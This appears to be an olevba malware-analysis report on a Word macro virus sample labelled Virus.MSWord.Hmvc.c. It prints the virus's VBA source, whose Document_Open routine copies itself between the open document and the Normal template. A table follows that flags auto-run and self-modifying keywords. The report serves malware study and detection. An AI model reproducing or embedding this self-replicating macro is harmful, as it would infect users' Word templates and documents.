olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Hmvc.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Hmvc.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO dr_bobo_macro_word_db.bas 
in file: ./Virus.MSWord.Hmvc.c - OLE stream: 'Macros/VBA/dr_bobo_macro_word_db'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()

'Author:   Dr.Bobo [bobo.tlsecurity.com]
'Name:     Dr.Bobo.Macro.Word.db
'Origin:   Croatia [Hrvatska]

Dim Norm, NormCode, NormLines, Doc, DocCode, DocLines
Set Norm = NormalTemplate.VBProject.VBComponents(1)
Set Doc = ActiveDocument.VBProject.VBComponents(1)
Set DocCode = Doc.CodeModule: Set NormCode = Norm.CodeModule

If DocCode.lines(23, 1) = "" Then
    For y = 1 To DocCode.countoflines
DocCode.replacelines y, "Dr.Bobo.Macro.Word.db"
    Next y
    For x = 2 To NormCode.countoflines
DocCode.insertlines 26 + x, NormCode.lines(x, 1)
   Next x
End If

If NormCode.lines(23, 1) = "" Then
    For y = 1 To NormCode.countoflines
NormCode.replacelines y, "Dr.Bobo.Macro.Word.db"
    Next y
    For x = 1 To DocCode.countoflines
NormCode.insertlines 26 + x, DocCode.lines(x, 1)
    Next x
End If
End Sub

Private Sub Document_New()
End Sub

Private Sub Document_Close()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

